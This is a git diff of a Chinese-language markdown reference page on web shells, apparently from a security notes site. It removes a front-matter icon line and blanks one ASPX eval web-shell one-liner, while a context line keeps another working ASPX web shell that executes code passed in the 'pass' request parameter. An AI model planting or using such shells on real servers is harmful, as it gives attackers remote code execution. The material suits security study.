@@ -1,7 +1,6 @@
 ---
 title: Web Shell
 index: true
-icon: w
 order: 1
 isOriginal : true
 date: 2024-03-14
@@ -186,7 +185,7 @@ array_filter($array1,$func);
 ## aspx 代码执行
 
 ```php
-<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+<%@ Page Language="Jscript"%><%                                    %>
 //webshell 密码 pass
 <%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["pass"], "unsafe"));%>
 ```
